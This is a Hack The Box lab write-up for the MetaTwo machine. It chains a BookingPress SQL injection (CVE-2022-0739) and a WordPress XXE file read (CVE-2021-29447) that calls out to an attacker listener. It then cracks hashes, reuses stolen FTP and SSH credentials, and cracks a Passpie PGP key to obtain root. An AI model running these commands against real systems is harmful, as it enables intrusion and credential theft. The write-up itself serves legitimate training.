# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [MetaTwo](https://app.hackthebox.com/machines/MetaTwo) |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥 **OS**         | Linux                                                  |
| 🎯 **Difficulty** | Easy                                                   |
| 📁 **Tags**       | WordPress, CVE-2022-0739, CVE-2021-29447, XXE, Passpie |

# Scan
```
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
```

# Attack path
1. [Obtain credentials for `manager` WordPress user using SQL injection in Booking press 1.0.10 plugin](#obtain-credentials-for-manager-wordpress-user-using-sql-injection-in-booking-press-1010-plugin)
2. [Gain initial access using discovered credentials for `jnelson` user](#gain-initial-access-using-discovered-credentials-for-jnelson-user)
3. [Escalate to `root` user using credentials discovered in Passpie](#escalate-to-root-user-using-credentials-discovered-in-passpie)

### Obtain credentials for `manager` WordPress user using SQL injection in Booking press 1.0.10 plugin

#### Add `metapress.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ echo "$TARGET metapress.htb" | sudo tee -a /etc/hosts
10.129.228.95 metapress.htb
```

#### Exfiltrate WordPress hashed passwords using SQL injection in Booking press 1.0.10 plugin ([CVE-2022-0739](https://nvd.nist.gov/vuln/detail/CVE-2022-0739))
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ WP_NONCE=$(curl -s http://metapress.htb/events/ | grep -oP "wpnonce:'\K[^']+" | head -n 1)
git clone -q https://github.com/destr4ct/CVE-2022-0739.git
python3 ./CVE-2022-0739/booking-press-expl.py -u http://metapress.htb/ -n $WP_NONCE
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

#### Crack hash for `manager` user
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ hashcat -m 400 '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70' /usr/share/wordlists/rockyou.txt --quiet --show
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```

### Gain initial access using discovered credentials for `jnelson` user

#### Prepare bash alias for file exaltation using authenticated XXE in WordPress 5.7.0 ([CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447))
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ git clone -q https://github.com/magicrc/CVE-2021-29447.git && \
xxe_cat() {
    python3 ./CVE-2021-29447/CVE-2021-29447.py \
        --lhost 10.10.14.157 \
        --lport 8000 \
        --target http://metapress.htb \
        --user manager \
        --password partylikearockstar \
        --file $1
}; alias xxe_cat='xxe_cat' && \
xxe_cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

#### Exfiltrate nginx default site configuration to obtain web application root directory
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo/CVE-2021-29447]
└─$ xxe_cat /etc/nginx/sites-available/default
server {

        listen 80;
        listen [::]:80;

        root /var/www/metapress.htb/blog;

        index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

        location / {
                try_files $uri $uri/ /index.php?$args;
        }
    
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }

}
```

#### Exfiltrate `wp-config.php` configuration to discover credentials for `metapress.htb` FTP user
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo/CVE-2021-29447]
└─$ xxe_cat /var/www/metapress.htb/blog/wp-config.php
<SNIP>
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
<SNIP>
```

#### Use `metapress.htb` FTP user to exfiltrate `send_email.php`
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ ftp metapress.htb@metapress.htb                                
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.129.228.95]
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61654|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete
ftp> cd mailer
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||65037|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||58224|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |*******************************************************************************************************************************************************|  1126       20.26 MiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (46.65 KiB/s)
```

#### Find credentials of `jnelson` user in `send_email.php`
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ cat send_email.php 
<SNIP>
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   
<SNIP>
```

#### Gain initial foothold with found credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ ssh jnelson@metapress.htb
jnelson@metapress.htb's password: 
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jun 14 15:37:12 2025 from 10.10.14.157
jnelson@meta2:~$ id
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
```

### Escalate to `root` user using credentials discovered in Passpie

#### Exfiltrate Passpie `.keys` file and crack it's passphrase
`linpeas.sh` has found `/home/jnelson/.passpie/.keys`
```
┌──(magicrc㉿perun)-[~/attack/HTB MetaTwo]
└─$ scp jnelson@metapress.htb:~/.passpie/.keys . && \
csplit -z .keys '/-----BEGIN PGP PRIVATE KEY BLOCK-----/' '{*}' --suffix-format=%02d.key --prefix=key_ && \
gpg2john key_01.key > gpg.hash && \
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt
jnelson@metapress.htb's password: 
.keys                                                                                                                                                             100% 5243    98.2KB/s   00:00    
2509
2734

File key_01.key
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:11 DONE (2025-06-14 20:34) 0.08354g/s 14.03p/s 14.03c/s 14.03C/s peanut..222222
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### Use discovered passphrase to export `root` user password
```
jnelson@meta2:~$ passpie export vault.pass && cat vault.pass
Passphrase: 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

#### Escalate to `root` user using discovered credentials
```
jnelson@meta2:~$ su root
Password: 
root@meta2:/home/jnelson# id
uid=0(root) gid=0(root) groups=0(root)
```





